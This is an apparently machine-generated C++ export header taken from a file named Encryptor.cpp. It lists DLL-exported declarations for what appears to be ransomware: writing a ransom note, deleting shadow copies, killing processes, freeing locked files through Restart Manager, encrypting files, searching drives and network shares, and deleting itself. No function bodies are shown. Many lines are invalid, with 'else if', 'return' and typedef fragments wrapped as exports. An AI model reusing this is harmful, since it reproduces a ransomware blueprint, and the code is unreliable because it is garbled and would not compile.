// Auto-generated export.cpp from Encryptor.cpp

#include <windows.h>


extern "C" __declspec(dllexport) void makeNote(LPCWSTR notePath);

extern "C" __declspec(dllexport) void DowngradeThreadTokenForThreadHandle(PHANDLE hThread);

extern "C" __declspec(dllexport) BOOL IsWow64();

extern "C" __declspec(dllexport) void removeShadows();

extern "C" __declspec(dllexport) void TerminateActiveProcessList();

extern "C" __declspec(dllexport) bool CreateAndContinue(const wchar_t* _mutexName);

extern "C" __declspec(dllexport) void GetHex(BYTE* bytes, size_t size, char* output);

extern "C" __declspec(dllexport) void getUserNote(std::wstring& result);

extern "C" __declspec(dllexport) void DoIOCP(LPWSTR* lpwParams, int paramsCount);

extern "C" __declspec(dllexport) LONG WINAPI TTOP_LEVEL_EXCEPTION_FILTER(__in _EXCEPTION_POINTERS* ExceptionInfo);

extern "C" __declspec(dllexport) void SelfDelete2();

extern "C" __declspec(dllexport) bool read_next_block(over_struct* o);

extern "C" __declspec(dllexport) bool read_next_block(over_struct* o, LONGLONG offset, int operation = operation_read);

extern "C" __declspec(dllexport) return read_next_block(o);

extern "C" __declspec(dllexport) bool write_block(over_struct* o,
	LONGLONG offset, 
	char* buff, DWORD size, 
	int operation_type = operation_write);

extern "C" __declspec(dllexport) LONGLONG OverlappedOffsetToLongLong(OVERLAPPED& ov);

extern "C" __declspec(dllexport) void close_file(over_struct* s);

extern "C" __declspec(dllexport) DWORD WINAPI ReadWritePoolThread(LPVOID lpParams);

extern "C" __declspec(dllexport) else if(str->operation == operation_read);

extern "C" __declspec(dllexport) else if((str->encHeader.encType & ENCTYPE_FULL_FILE) == ENCTYPE_FULL_FILE);

extern "C" __declspec(dllexport) else if(str->operation == operation_write);

extern "C" __declspec(dllexport) else if(str->operation == operation_write_eof);

extern "C" __declspec(dllexport) else if(str->operation == operation_write_closehandle);

extern "C" __declspec(dllexport) typedef DWORD(WINAPI* tRmStartSession)(DWORD* pSessionHandle, DWORD    dwSessionFlags, WCHAR* strSessionKey);

extern "C" __declspec(dllexport) typedef DWORD(WINAPI* tRmRegisterResources)(DWORD dwSessionHandle, UINT nFiles, LPCWSTR* rgsFileNames, UINT nApplications, RM_UNIQUE_PROCESS* rgApplications, UINT nServices, LPCWSTR* rgsServiceNames);

extern "C" __declspec(dllexport) typedef DWORD(WINAPI* tRmGetList)(DWORD dwSessionHandle, UINT* pnProcInfoNeeded, UINT* pnProcInfo, RM_PROCESS_INFO* rgAffectedApps, LPDWORD lpdwRebootReasons);

extern "C" __declspec(dllexport) typedef DWORD(WINAPI* tRmEndSession)(DWORD dwSessionHandle);

extern "C" __declspec(dllexport) typedef DWORD(WINAPI* tRmShutdown)(DWORD dwSessionHandle, ULONG lActionFlags, RM_WRITE_STATUS_CALLBACK fnStatus);

extern "C" __declspec(dllexport) bool FreeFileBusyResources(const wchar_t* PathName);

extern "C" __declspec(dllexport) void EncryptFileIOCP(const std::wstring & filepath);

extern "C" __declspec(dllexport) else if(default_parameters.bEncryptFileBlocks);

extern "C" __declspec(dllexport) void SearchFolder(std::wstring path);

extern "C" __declspec(dllexport) DWORD WINAPI CalculateSpeedsThread(LPVOID);

extern "C" __declspec(dllexport) bool isCpuAesSupports();

extern "C" __declspec(dllexport) DWORD WINAPI DriveSearchThread(LPVOID dw);

extern "C" __declspec(dllexport) BOOL WINAPI CtrlHandler(DWORD fdwCtrlType);

extern "C" __declspec(dllexport) void SearchDrives(std::vector<HANDLE>& searchThreads);

extern "C" __declspec(dllexport) void SearchNetFolders(std::vector<HANDLE> & searchThreads, _In_ LPNETRESOURCEW pNetResource);

extern "C" __declspec(dllexport) void DoIOCP(LPWSTR *lpwParams, int numArgs);

extern "C" __declspec(dllexport) else if(numArgs == 1);
